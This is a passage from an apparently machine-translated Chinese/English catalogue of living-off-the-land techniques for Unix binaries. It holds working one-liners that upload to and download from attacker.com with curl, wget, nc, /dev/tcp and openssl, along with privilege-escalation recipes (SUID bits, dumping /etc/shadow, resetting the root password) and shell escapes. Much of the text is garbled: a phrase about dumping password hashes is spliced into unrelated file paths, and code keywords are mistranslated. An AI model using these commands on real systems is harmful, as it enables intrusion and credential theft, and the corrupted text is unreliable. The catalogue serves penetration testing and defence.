zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(</path/to/input-file)" >&$REPLY'
```
**receiver**: `tcp-server`

---

## Download (download)

> 该可执行文件可以下载远程数据。

共 **32** 个工具支持此功能。

| # | 工具名 | 示例数 | 权限上下文 |
|---|--------|--------|-----------|
| 1 | `ab` | 1 | sudo, suid, unprivileged |
| 2 | `aria2c` | 1 | sudo, suid, unprivileged |
| 3 | `bash` | 2 | sudo, suid, unprivileged |
| 4 | `code` | 1 | sudo, unprivileged |
| 5 | `curl` | 1 | sudo, suid, unprivileged |
| 6 | `finger` | 1 | sudo, suid, unprivileged |
| 7 | `ftp` | 1 | sudo, suid, unprivileged |
| 8 | `jjs` | 1 | sudo, unprivileged |
| 9 | `jrunscript` | 1 | sudo, unprivileged |
| 10 | `julia` | 1 | sudo, suid, unprivileged |
| 11 | `lua` | 1 | sudo, suid, unprivileged |
| 12 | `lwp-download` | 1 | sudo, unprivileged |
| 13 | `nc` | 2 | sudo, suid, unprivileged |
| 14 | `nginx` | 1 | sudo |
| 15 | `node` | 1 | sudo, suid, unprivileged |
| 16 | `openssl` | 1 | sudo, suid, unprivileged |
| 17 | `perl` | 1 | sudo, unprivileged |
| 18 | `php` | 1 | sudo, suid, unprivileged |
| 19 | `python` | 1 | sudo, suid, unprivileged |
| 20 | `ruby` | 1 | sudo, unprivileged |
| 21 | `scp` | 1 | sudo, suid, unprivileged |
| 22 | `sftp` | 1 | sudo, suid, unprivileged |
| 23 | `smbclient` | 1 | sudo, unprivileged |
| 24 | `socat` | 1 | sudo, suid, unprivileged |
| 25 | `ssh` | 1 | sudo, suid, unprivileged |
| 26 | `sshfs` | 1 | unprivileged |
| 27 | `tar` | 1 | sudo, suid, unprivileged |
| 28 | `tftp` | 1 | sudo, suid, unprivileged |
| 29 | `wget` | 1 | sudo, suid, unprivileged |
| 30 | `whois` | 1 | sudo, suid, unprivileged |
| 31 | `yum` | 1 | sudo |
| 32 | `zsh` | 1 | sudo, suid, unprivileged |

### `ab`

```bash
ab -v2 http://attacker.com/path/to/input-file
```
**sender**: `http-server`

### `aria2c`

> **注意**: Use `--allow-overwrite` 。 Similarly `-o /path/to/ouput-file` ，在这种情况下文件会保存到 `input-file` 当前工作目录中的
```bash
aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file
```

### `bash`

**方法 1:**

> ⚠️ 二进制数据可能会被损坏。
```bash
bash -c '{ echo -ne "GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/attacker.com/12345 \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >/path/to/output-file'
```
**suid** variant:
```bash
bash -p -c '{ echo -ne "GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/attacker.com/12345 \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >/path/to/output-file'
```
**sender**: `http-server`

**方法 2:**

> ⚠️ 二进制数据可能会被损坏。
```bash
bash -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
```
**suid** variant:
```bash
bash -p -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
```
**sender**: `tcp-server`

### `code`

> **注意**: 这需要一个有效的 GitHub 账户。

Run the command locally, 然后 on the attacker box navigate to <https://github.com/login/device>, ，使用提供的代码授权隧道。
```bash
code tunnel --name xxxxxx
```
**sender** (导航到 <https://vscode.dev/tunnel/xxxxxx> where a remote VS Code instance can be used to upload files to the victim box.

从菜单中选择 "File" -> "Open Folder...", right-click on the explorer pane, 然后 select "Upload..." to pick a file to send.

Alternatively it's possible to just create and edit files.):

### `curl`

```bash
curl http://attacker.com/path/to/input-file -o /path/to/output-file
```
**sender**: `http-server`

### `finger`

> **注意**: 命令挂起等待远程对等方关闭套接字。
```bash
finger x@attacker.com
```
**sender** (A TCP server can be used on the attacker box to send the data.):
```bash
nc -l -p 79 </path/to/input-file
```

### `ftp`

> **注意**: Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
```bash
ftp -a attacker.com
get /path/to/input-file output-file
```
**sender**: `ftp-server`

### `jjs`

> 此工具从 Java SE 8 开始安装。

```bash
jjs
var URL = Java.输入('java.net.URL');
var ws = new URL('http://attacker.com/path/to/input-file');
var Channels = Java.输入('java.nio.channels.Channels');
var rbc = Channels.newChannel(ws.openStream());
var FileOutputStream = Java.输入('java.io.FileOutputStream');
var fos = new FileOutputStream('/path/to/output-file');
fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
fos.close();
rbc.close();
```
**sender**: `http-server`

### `jrunscript`

> 此工具从 Java SE 6 开始安装。

```bash
jrunscript -e 'cp("http://attacker.com/path/to/input-file","/path/to/output-file")'
```
**sender**: `http-server`

### `julia`

```bash
julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
```
**sender**: `http-server`

### `lua`

> **注意**: This requires `lua-socket` 可用。
```bash
lua -e '
  local k=require("socket");
  local s=assert(k.bind("*",12345));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open("/path/to/output-file", "wb");
  f:write(d);
  io.close(f);'
```
**sender**: `tcp-client`

### `lwp-download`

> **注意**: 可以省略目标文件 `/path/to/output-file` ，在这种情况下文件会保存到 `input-file` 当前工作目录中的
```bash
lwp-download http://attacker.com/path/to/input-file /path/to/output-file
```

### `nc`

**方法 1:**

> **注意**: The file is actually written by the invoking shell.
```bash
nc -l -p 12345 >/path/to/output-file
```
**sender**: `tcp-client`

**方法 2:**

> **注意**: The file is actually written by the invoking shell.
```bash
nc attacker.com 12345 >/path/to/output-file
```
**sender**: `tcp-server`

### `nginx`

```bash
cat >/path/to/temp-file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c /path/to/temp-file
```
**sender** (An HTTP client can be used on the attacker box to send the data.):
```bash
curl -X PUT victim.com/path/to/output-file --data-binary @/path/to/input-file
```

### `node`

```bash
node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
```
**sender**: `http-server`

### `openssl`

```bash
openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
```
**sender**: `tls-server`

### `perl`

```bash
perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>"attacker.com",PeerPort=>80,Proto=>"tcp") or die; print $s "GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata: true\r\nConnection: close\r\n\r\n"; open(my $fh, ">", "/path/to/output-file") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "\r\n") { $in_content = 1; } } close($s); close($fh);'
```
**sender**: `http-server`

### `php`

```bash
php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file", $c);'
```
**sender**: `http-server`

### `python`

> 这些载荷兼容 Python 2 和 3 版本。

```bash
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve("http://attacker.com/path/to/input-file", "/path/to/output-file")'
```
**sender**: `http-server`

### `ruby`

```bash
ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download, "/path/to/output-file")'
```
**sender**: `http-server`

### `scp`

```bash
scp user@attacker.com:/path/to/input-file /path/to/output-file
```
**sender**: `ssh-server`

### `sftp`

```bash
sftp user@attacker.com
get /path/to/input-file /path/to/output-file
```
**sender**: `ssh-server`

### `smbclient`

```bash
smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file'
```
**sender** (A SMB/CIFS server can be used on the attacker box to receive the data (e.g, using [Impacket](https://github.com/SecureAuthCorp/impacket)).):
```bash
smbserver.py -smb2support share .
```

### `socat`

```bash
socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat
```
**sender**: `tcp-server`

### `ssh`

```bash
ssh user@attacker.com 'cat /path/to/input-file"
```
**sender**: `ssh-server`

### `sshfs`

```bash
sshfs user@attacker.com:/ /path/to/dir/
cp /path/to/dir/path/to/input-file /path/to/output-file
```
**sender**: `ssh-server`

### `tar`

> **注意**: 攻击者机器必须安装 `rmt` 工具。
```bash
tar xvf user@attacker.com:/path/to/input-文件转储密码哈希。tar --rsh-command=/bin/ssh
```
**sender**: `ssh-server`

### `tftp`

```bash
tftp attacker.com
get /path/to/input-file
```
**sender** (A TFTP server can be used on the attacker box to send the data.):
```bash
atftpd --no-fork --verbose --daemon --no-fork --user root.root .
```

### `wget`

```bash
wget http://attacker.com/path/to/input-file -O /path/to/output-file
```
**sender**: `http-server`

### `whois`

> **注意**: 接收的数据中 `\r` 字节实例被剥离。
```bash
whois -h attacker.com -p 12345 x
```
**sender**: `tcp-server`

### `yum`

> **注意**: 远程主机上的文件必须有 `.rpm` 扩展名，但内容不必是 RPM 文件。文件将被下载到 `/var/tmp/yum-root-xxxxxx/`.
```bash
yum install http://attacker.com/path/to/input-文件转储密码哈希。rpm
```
**sender**: `http-server`

### `zsh`

> ⚠️ 二进制数据可能会被损坏。
```bash
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
```
**sender**: `tcp-server`

---

## Library load (library-load)

> 该可执行文件可以加载共享库，这些库可用于在同一执行上下文中运行任意代码。

共 **11** 个工具支持此功能。

| # | 工具名 | 示例数 | 权限上下文 |
|---|--------|--------|-----------|
| 1 | `bash` | 1 | sudo, suid, unprivileged |
| 2 | `curl` | 1 | sudo, suid, unprivileged |
| 3 | `ffmpeg` | 1 | sudo, suid, unprivileged |
| 4 | `ldconfig` | 1 | sudo, suid, unprivileged |
| 5 | `mysql` | 1 | sudo, suid, unprivileged |
| 6 | `nginx` | 1 | sudo, suid, unprivileged |
| 7 | `openssl` | 1 | sudo, suid, unprivileged |
| 8 | `python` | 1 | capabilities, sudo, suid, unprivileged |
| 9 | `ruby` | 1 | sudo, unprivileged |
| 10 | `ssh-keygen` | 1 | sudo, suid, unprivileged |
| 11 | `tclsh` | 1 | capabilities, sudo, suid, unprivileged |

### `bash`

```bash
bash -c 'enable -f /path/to/lib.so x'
```
**suid** variant:
```bash
bash -p -c 'enable -f /path/to/lib.so x'
```

### `curl`

```bash
curl --engine /path/to/lib.so x
```

### `ffmpeg`

```bash
ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-文件转储密码哈希。wav
reset^J
```

### `ldconfig`

> **注意**: 这允许全局覆盖一个或多个共享库（例如 `libpcap`) globally, 然后 triggers the execution by running a program that uses it, e.g., `ping`. 如果目标二进制文件是 SUID，这特别有用。但要注意，很容易导致目标系统损坏。

首先识别目标程序使用的共享库，例如：

```
$ ldd /bin/ping | grep libcap
        libcap.so.2 => /path/to/temp-dir/libcap.so.2 (0x00007f8417eef000)
```

然后创建名为 `libcap.so.2`, 的共享库覆盖，并将其放入 `/path/to/temp-dir/`. 程序可能需要库覆盖中的一些导出符号，在这种情况下请确保添加它们（例如 `void cap_get_flag() {}`).
```bash
echo /path/to/temp-dir/ >/path/to/temp-file
ldconfig -f /path/to/temp-file
ping
```

### `mysql`

> 必须有一个可用的 MySQL 服务器来连接。

> **注意**: The following loads the `/path/to/lib.so` shared object.
```bash
mysql --default-auth ../../../../../path/to/lib
```

### `nginx`

> **注意**: Alternatively, the `ssl_engine` directive can be used.
```bash
cat >/path/to/temp-file <<EOF
load_module /path/to/lib.so;
EOF

nginx -t -c /path/to/temp-file
```

### `openssl`

```bash
openssl req -engine ./lib.so
```

### `python`

> 这些载荷兼容 Python 2 和 3 版本。

```bash
python -c 'from c输入s import cdll; cdll.LoadLibrary("/path/to/lib.so")'
```

### `ruby`

```bash
ruby -e 'require "fiddle"; Fiddle.dlopen("/path/to/lib.so")'
```

### `ssh-keygen`

> **注意**: 共享库必须包含 `void C_GetFunctionList() {}` 函数。
```bash
ssh-keygen -D /path/to/lib.so
```

### `tclsh`

```bash
tclsh
load /path/to/lib.so x
```

---

## Privilege escalation (privilege-escalation)

> 该可执行文件提供了一种权限提升机制，通过间接启用提升的权限，例如设置 SUID 位或修改另一个可执行文件的所有权。

共 **14** 个工具支持此功能。

| # | 工具名 | 示例数 | 权限上下文 |
|---|--------|--------|-----------|
| 1 | `chattr` | 1 | sudo, suid |
| 2 | `chmod` | 1 | sudo, suid |
| 3 | `chown` | 1 | sudo, suid |
| 4 | `cp` | 2 | sudo, suid |
| 5 | `getent` | 1 | sudo, suid |
| 6 | `install` | 1 | sudo, suid |
| 7 | `ln` | 1 | sudo |
| 8 | `mount` | 1 | sudo |
| 9 | `mv` | 1 | sudo, suid |
| 10 | `passwd` | 1 | sudo |
| 11 | `setcap` | 1 | sudo, suid |
| 12 | `setfacl` | 1 | sudo, suid |
| 13 | `unsquashfs` | 1 | sudo, suid |
| 14 | `unzip` | 1 | sudo, suid |

### `chattr`

> **注意**: 使目标文件不可变。
```bash
chattr +i /path/to/input-file
```

### `chmod`

> **注意**: 这可以使用提升的权限运行来更改权限 (`6` 表示 SUID 位) and 然后 read, write, or execute a 文件转储密码哈希。
```bash
chmod 6777 /path/to/input-file
```

### `chown`

> **注意**: This can be run with elevated privileges to change ownership and 然后 read, write, or execute a 文件转储密码哈希。
```bash
chown $(id -un):$(id -gn) /path/to/input-file
```

### `cp`

**方法 1:**

> **注意**: This can be used to copy and 然后 read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` 有 `--parents` 选项，可用于在目标文件夹中创建源路径中指定的目录层次结构。）
```bash
cp /path/to/input-file /path/to/output-file
```

**方法 2:**

> **注意**: 这可以从任何 SUID 二进制文件（例如 `/path/to/input-file`) ）复制 SUID 权限到另一个文件。
```bash
cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file
```

### `getent`

> **注意**: 这允许从 `/etc/shadow` 文件转储密码哈希。
```bash
getent shadow
```

### `install`

> **注意**: 这可以使用提升的权限运行来更改权限 (`6` 表示 SUID 位) and 然后 read, write, or execute a 文件转储密码哈希。
```bash
install -m 6777 /path/to/input-file /path/to/output-dir/
```

### `ln`

> **注意**: 这用指向 `ln` itself with 中写入指向 a shell (or any other executable) that is to be executed as root, useful in case a `sudo` 本身，该 Shell 将以 root 身份执行，在 `ln` 规则只允许按路径运行
```bash
ln -fs /bin/sh /bin/ln
ln
```

### `mount`

> **注意**: 这用指向 `mount` itself with a shell (or any other executable).
```bash
mount -o bind /bin/sh /bin/mount
mount
```

### `mv`

> **注意**: This can be used to move and 然后 read or write files from a restricted file systems or with elevated privileges.
```bash
mv /path/to/input-file /path/to/output-file
```

### `passwd`

> **注意**: 这将 root 密码更改为 `x`, ，因此现在可以使用例如 `su`.
```bash
echo -e 'x\nx' | passwd
```

### `setcap`

> **注意**: 这可用于为可执行文件分配 capabilities。
```bash
setcap cap_setuid+ep /path/to/command
```

### `setfacl`

> **注意**: This can be run with elevated privileges to change ownership and 然后 read, write, or execute a 文件转储密码哈希。
```bash
setfacl -m u:$(id -un):rwx /path/to/input-file
```

### `unsquashfs`

> `unsquashfs` 在提取文件系统时保留 SUID 位。例如，事先使用以下命令以 root 身份准备归档：

```
cp /bin/sh .
chmod +s sh
mksquashfs sh shell
```

```bash
unsquashfs shell
./squashfs-root/sh -p
```

### `unzip`

> 某些 `unzip` 版本允许保留 SUID 位。例如，事先使用以下命令以 root 身份准备归档：

```
cp /bin/sh .
chmod +s sh
zip shell.zip sh
```

```bash
unzip -K shell.zip
./sh -p
```

---

## Inherit (inherit)

> 该可执行文件可以从另一个可执行文件继承功能。

共 **71** 个工具支持此功能。

| # | 工具名 | 示例数 | 权限上下文 |
|---|--------|--------|-----------|
| 1 | `apport-cli` | 1 | unprivileged |
| 2 | `apt-get` | 1 | sudo, unprivileged |
| 3 | `aptitude` | 1 | sudo, unprivileged |
| 4 | `aws` | 1 | sudo, unprivileged |
| 5 | `bashbug` | 1 | sudo, unprivileged |
| 6 | `batcat` | 1 | sudo, suid, unprivileged |
| 7 | `bee` | 1 | sudo, suid, unprivileged |
| 8 | `bundle` | 2 | sudo, unprivileged |
| 9 | `busctl` | 1 | sudo, suid, unprivileged |
| 10 | `busybox` | 2 | sudo, unprivileged |
| 11 | `byebug` | 1 | sudo, unprivileged |
| 12 | `cargo` | 1 | sudo, unprivileged |
| 13 | `cowsay` | 1 | sudo, unprivileged |
| 14 | `cowthink` | 1 | sudo, unprivileged |
| 15 | `cpan` | 1 | sudo, unprivileged |
| 16 | `crash` | 1 | sudo, suid, unprivileged |
| 17 | `crontab` | 1 | sudo, unprivileged |
| 18 | `dmesg` | 1 | sudo, suid, unprivileged |
| 19 | `dpkg` | 1 | sudo, suid, unprivileged |
| 20 | `dstat` | 1 | sudo, unprivileged |
| 21 | `easy_install` | 1 | sudo, unprivileged |
| 22 | `eb` | 1 | sudo, unprivileged |
| 23 | `ex` | 1 | sudo, suid, unprivileged |
| 24 | `exiftool` | 1 | sudo, unprivileged |
| 25 | `facter` | 2 | sudo, unprivileged |
| 26 | `gcloud` | 1 | sudo, suid, unprivileged |
| 27 | `gdb` | 1 | sudo, suid, unprivileged |
| 28 | `gem` | 3 | sudo, unprivileged |
| 29 | `gimp` | 1 | sudo, unprivileged |
| 30 | `git` | 2 | sudo, unprivileged |
| 31 | `irb` | 1 | sudo, unprivileged |
| 32 | `journalctl` | 1 | sudo, unprivileged |
| 33 | `knife` | 1 | sudo, unprivileged |
| 34 | `latexmk` | 1 | sudo, unprivileged |
| 35 | `less` | 1 | sudo, suid, unprivileged |
| 36 | `lualatex` | 1 | sudo, suid, unprivileged |
| 37 | `luatex` | 1 | sudo, suid, unprivileged |
| 38 | `man` | 1 | sudo, suid, unprivileged |
| 39 | `msfconsole` | 1 | sudo, unprivileged |
| 40 | `needrestart` | 1 | sudo, unprivileged |
| 41 | `nmap` | 1 | sudo, suid, unprivileged |
| 42 | `opencode` | 1 | sudo, unprivileged |
| 43 | `pandoc` | 1 | sudo, suid, unprivileged |
| 44 | `pdb` | 1 | sudo, unprivileged |
| 45 | `pip` | 1 | sudo, unprivileged |
| 46 | `pipx` | 1 | sudo, unprivileged |
| 47 | `poetry` | 1 | sudo, unprivileged |
| 48 | `pry` | 1 | sudo, unprivileged |
| 49 | `psql` | 1 | sudo, suid, unprivileged |
| 50 | `rake` | 1 | sudo, unprivileged |
| 51 | `rpm` | 1 | sudo, suid, unprivileged |
| 52 | `rpmdb` | 1 | sudo, suid, unprivileged |
| 53 | `rpmquery` | 1 | sudo, suid, unprivileged |
| 54 | `rpmverify` | 1 | sudo, suid, unprivileged |
| 55 | `run-mailcap` | 2 | sudo, unprivileged |
| 56 | `rustc` | 1 | sudo, unprivileged |
| 57 | `sqlmap` | 1 | sudo, unprivileged |
| 58 | `systemctl` | 1 | sudo, suid, unprivileged |
| 59 | `systemd-resolve` | 1 | sudo |
| 60 | `timedatectl` | 1 | sudo, unprivileged |
| 61 | `tshark` | 1 | sudo, unprivileged |
| 62 | `vagrant` | 1 | sudo, unprivileged |
| 63 | `vigr` | 1 | sudo, suid |
| 64 | `vim` | 3 | sudo, suid, unprivileged |
| 65 | `vipw` | 1 | sudo, suid |
| 66 | `volatility` | 1 | sudo, suid, unprivileged |
| 67 | `wireshark` | 1 | sudo, unprivileged |
| 68 | `wish` | 1 | sudo, suid, unprivileged |
| 69 | `yum` | 1 | sudo |
| 70 | `zless` | 1 | sudo, suid, unprivileged |
| 71 | `zsh` | 1 | sudo, suid, unprivileged |

### `apport-cli`

> **注意**: 终端界面需要一些选择才能生成分页器。
```bash
apport-cli -f
1
2
v
```

### `apt-get`

```bash
apt-get changelog apt
```

### `aptitude`

```bash
aptitude changelog aptitude
```

### `aws`

```bash
aws help
```

### `bashbug`

```bash
bashbug
```

### `batcat`

> **注意**: `--paging always` can be omitted ，这允许运行 SQLite 查询 the output doesn't fit the screen.
```bash
batcat --paging always /etc/hosts
```

### `bee`

> **注意**: 这允许运行 PHP 代码 (`...`).

这必须从 Backdrop CMS 根目录（例如 `/var/www/html`), ）执行，或者使用 `--root` 选项读取文件。
```bash
bee eval '...'
```

### `bundle`

**方法 1:**

```bash
bundle help
```

**方法 2:**

```bash
touch Gemfile
bundle console
```

### `busctl`

```bash
busctl --show-machine
```

### `busybox`

> BusyBox 可能包含许多工具，运行 `busybox --list-full` 检查支持哪些其他二进制文件。

**方法 1:**

```bash
busybox ash
```

**方法 2:**

```bash
busybox cat
```

### `byebug`

```bash
byebug --no-stop /path/to/script.rb
```

### `cargo`

```bash
cargo help doc
```

### `cowsay`

```bash
cowsay -f /path/to/script.pl x
```

### `cowthink`

```bash
cowthink -f /path/to/script.pl x
```

### `cpan`

> **注意**: 可以使用 `!` 命令。
```bash
cpan
! ...
```

### `crash`

```bash
crash -h
```

### `crontab`

```bash
crontab -e
```

### `dmesg`

```bash
dmesg -H
```

### `dpkg`

```bash
dpkg -l
```

### `dstat`

> **注意**: `dstat` allows you to run arbitrary Python scripts loaded as "external plugins" if they are located in one of the directories, stated in the `dstat` 手册页"FILES"下列出的某个目录中，这允许您运行作为"外部插件"加载的任意 Python 脚本：

- `~/.dstat/`
- `(path of binary)/plugins/`
- `/usr/share/dstat/`
- `/usr/local/share/dstat/`

选择您可以写入的那个。名为 `xxx` 的插件文件名必须在 `dstat_xxx.py` 文件转储密码哈希。
```bash
dstat --xxx
```

### `easy_install`

> **注意**: 这允许运行 Python 代码 (`...`). 它在作为参数传递的目录 `setup.py` 中执行名为 (`.`).

请记住 TTY 会丢失，因此可以使用 `/dev/tty` ，例如：

```
echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py
```
```bash
echo '...' >setup.py
easy_install .
```

### `eb`

> 要使此方法生效，目标必须通过 EB CLI 连接到 AWS 实例。

```bash
eb logs
```

### `ex`

```bash
ex
```

### `exiftool`

> **注意**: 这允许运行 Perl 代码 (`...`).
```bash
exiftool -if '...' /etc/passwd
```

### `facter`

**方法 1:**

> **注意**: The first `.rb` 目录中的第一个 `/path/to/dir/` 文件将被执行。
```bash
FACTERLIB=/path/to/dir/ facter
```

**方法 2:**

> **注意**: The first `.rb` 目录中的第一个 `/path/to/dir/` 文件将被执行。
```bash
facter --custom-dir=/path/to/dir/ x
```

### `gcloud`

```bash
gcloud help
```

### `gdb`

> **注意**: 这允许运行 Python 代码 (`...`).
```bash
gdb -nx -ex 'python ...' -ex quit
```

### `gem`

**方法 1:**

> **注意**: 这要求提供已安装 gem 的名称，例如 `debug` 通常已安装。
```bash
gem open debug
```

**方法 2:**

```bash
gem build /path/to/script.rb
```

**方法 3:**

```bash
gem install --file /path/to/script.rb
```

### `gimp`

> **注意**: 这允许运行 Python 代码 (`...`). 之后会挂起，可以通过按 `Ctrl-C`.
```bash
gimp -idf --batch-interpreter=python-fu-eval -b '...'
```

### `git`

**方法 1:**

```bash
git help config
```

**方法 2:**

> **注意**: 帮助系统也可以从任何 `git` 命令访问，例如 `git branch`.
```bash
git branch --help config
!/bin/sh
```

### `irb`

> **注意**: 这允许运行 Ruby 代码 (`...`).
```bash
irb
...
```

### `journalctl`

> 如果由非特权用户运行，根据系统配置，这可能不起作用。

```bash
journalctl
```

### `knife`

> **注意**: 这允许运行 Ruby 代码 (`...`).
```bash
knife exec -E '...'
```

### `latexmk`

> **注意**: 这允许运行 Perl 代码 (`...`).
```bash
latexmk -e '...'
```

### `less`

```bash
less /etc/hosts
v
```

### `lualatex`

> **注意**: 这允许运行 Lua 代码 (`...`).
```bash
lualatex -shell-escape '\directlua{...}\end'
```

### `luatex`

> **注意**: 这允许运行 Lua 代码 (`...`).
```bash
luatex -shell-escape '\directlua{...}\end'
```

### `man`

```bash
man man
```

### `msfconsole`

```bash
msfconsole
irb
```

### `needrestart`

> **注意**: 这允许运行 Perl 代码 (`...`).
```bash
echo '...' >/path/to/temp-file
needrestart -c /path/to/temp-file
```

### `nmap`

> **注意**: 这允许运行 Lua 代码 (`...`).
```bash
echo '...' >/path/to/temp-file
nmap --script=/path/to/temp-file
```

### `opencode`

> **注意**: 如果安装了 (`...`) ，这允许运行 SQLite 查询 `sqlite3` 。
```bash
opencode db '...'
```

### `pandoc`

> **注意**: 这允许运行 Lua 代码 (`...`).
```bash
echo '...' >/path/to/temp-file
pandoc -L /path/to/temp-file /dev/null
```

### `pdb`

> **注意**: 这允许运行 Python 代码 (`...`).
```bash
echo '...' >/path/to/temp-file
pdb /path/to/temp-file
cont
```

### `pip`

> **注意**: 这允许运行 Python 代码 (`...`). 它在作为参数传递的目录 `setup.py` 中执行名为 (`.`).

请记住 TTY 会丢失，因此可以使用 `/dev/tty` ，例如：

```
echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py
```

The `--break-system-packages` 标志可以在较旧的系统中省略。
```bash
echo '...' >setup.py
pip install --break-system-packages .
```

### `pipx`

> **注意**: 这允许运行 Python 代码 (`...`).
```bash
echo '...' >/path/to/文件转储密码哈希。py
pipx run /path/to/文件转储密码哈希。py
```

### `poetry`

> **注意**: 这允许运行 Python 代码 (`...`).

当前工作目录中必须存在有效的 `pyproject.toml` 文件，您可以使用 `poetry init -n`.
```bash
echo '...' >/path/to/temp-file
poetry run python /path/to/temp-file
```

### `pry`

```bash
pry
```

### `psql`

> 必须有一个可用的 PostgreSQL 服务器来连接。

```bash
psql
\?
```

### `rake`

> **注意**: 这允许运行 Ruby 代码 (`...`).
```bash
rake -p '...'
```

### `rpm`

> **注意**: 这允许运行 Lua 代码 (`...`).
```bash
rpm --eval '%{lua:...}'
```

### `rpmdb`

> **注意**: 这允许运行 Lua 代码 (`...`).
```bash
rpmdb --eval '%{lua:...}'
```

### `rpmquery`

> **注意**: 这允许运行 Lua 代码 (`...`).
```bash
rpmquery --eval '%{lua:...}'
```

### `rpmverify`

> **注意**: 这允许运行 Lua 代码 (`...`).
```bash
rpmverify --eval '%{lua:...}'
```

### `run-mailcap`

**方法 1:**

```bash
run-mailcap --action=view text/plain:/etc/hosts
```

**方法 2:**

> **注意**: The file must exist and be not empty.
```bash
run-mailcap --action=edit text/plain:/path/to/output-file
```

### `rustc`

```bash
rustc --explain E0001
```

### `sqlmap`

> **注意**: 这允许运行 Python 代码 (`...`).
```bash
sqlmap -u 127.0.0.1 --eval='...'
```

### `systemctl`

```bash
systemctl
```

### `systemd-resolve`

```bash
systemd-resolve --status
```

### `timedatectl`

> 如果由非特权用户运行，根据系统配置，这可能不起作用。

```bash
timedatectl list-timezones
```

### `tshark`

> **注意**: 这允许运行 Lua 代码 (`...`).
```bash
echo '...' >/path/to/temp-file
tshark -Xlua_script:/path/to/temp-file
```

### `vagrant`

> **注意**: 这允许运行 Ruby 代码 (`...`).
```bash
echo '...' >Vagrantfile
vagrant up
```

### `vigr`

> **注意**: 尽管需要超级用户权限才能运行，但编辑器以非特权用户身份执行。
```bash
vigr
```

### `vim`

**方法 1:**

> **注意**: 这允许运行 Python 代码 (`...`).
```bash
vim -c ':py ...'
```

**方法 2:**

> **注意**: 这允许运行 Lua 代码 (`...`).
```bash
vim -c ':lua ...'
```

**方法 3:**

```bash
vim
```

### `vipw`

> **注意**: 尽管需要超级用户权限才能运行，但编辑器以非特权用户身份执行。
```bash
vipw
```

### `volatility`

> 这允许运行 Python 代码 (`...`). 需要一些有效的核心转储文件，如果没有，可以上传到目标。

```bash
volatility -f /path/to/core-dump volshell
...
```

### `wireshark`

> **注意**: This requires GUI interaction. Start Wireshark, 然后 from the main menu, select "Tools" -> "Lua" -> "Evaluate". 。会打开一个允许执行 Lua 代码的窗口。
```bash
wireshark
```

### `wish`

```bash
wish
```

### `yum`

> **注意**: 这允许运行 Python 代码 (`...`).
```bash
cat >/path/to/temp-dir/x<<EOF
[main]
plugins=1
pluginpath=/path/to/temp-dir/
pluginconfpath=/path/to/temp-dir/
EOF

cat >/path/to/temp-dir/y.conf<<EOF
[main]
enabled=1
EOF

cat >/path/to/temp-dir/y.py<<EOF
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  ...
EOF

yum -c /path/to/temp-dir/x --enableplugin=y
```

### `zless`

```bash
zless /path/to/input-file
```

### `zsh`

```bash
zsh -c '</etc/hosts'
```

---

## 附录：工具名快速索引

| 工具名 | 支持的功能 |
|--------|-----------|
| `7z` | File read |
| `R` | Shell |
| `aa-exec` | Shell |
| `ab` | Download, Upload |
| `acr` | Command |
| `agetty` | Shell |
| `alpine` | File read |
| `ansible-playbook` | Shell |
| `ansible-test` | Shell |
| `aoss` | Shell |
| `apache2` | File read |
| `apache2ctl` | File read |
| `apport-cli` | Inherit |
| `apt-get` | Inherit, Shell |
| `aptitude` | Inherit |
| `ar` | File read |
| `arch-nspawn` | Shell |
| `aria2c` | Command, Download, File read |
| `arj` | File read, File write |
| `arp` | File read |
| `as` | File read |
| `ascii-xfr` | File read |
| `ascii85` | File read |
| `ash` | File write, Shell |
| `aspell` | File read |
| `asterisk` | Shell |
| `at` | Command, Shell |
| `atobm` | File read |
| `autoconf` | Shell |
| `autoheader` | Shell |
| `autoreconf` | Shell |
| `aws` | File read, Inherit |
| `base32` | File read |
| `base58` | File read |
| `base64` | File read |
| `basenc` | File read |
| `basez` | File read |
| `bash` | Download, File read, File write, Library load, Reverse shell, Shell, Upload |
| `bashbug` | Inherit |
| `batcat` | Inherit |
| `bbot` | File read |
| `bc` | File read |
| `bconsole` | File read, Shell |
| `bee` | Inherit |
| `borg` | Shell |
| `bpftrace` | Shell |
| `bridge` | File read |
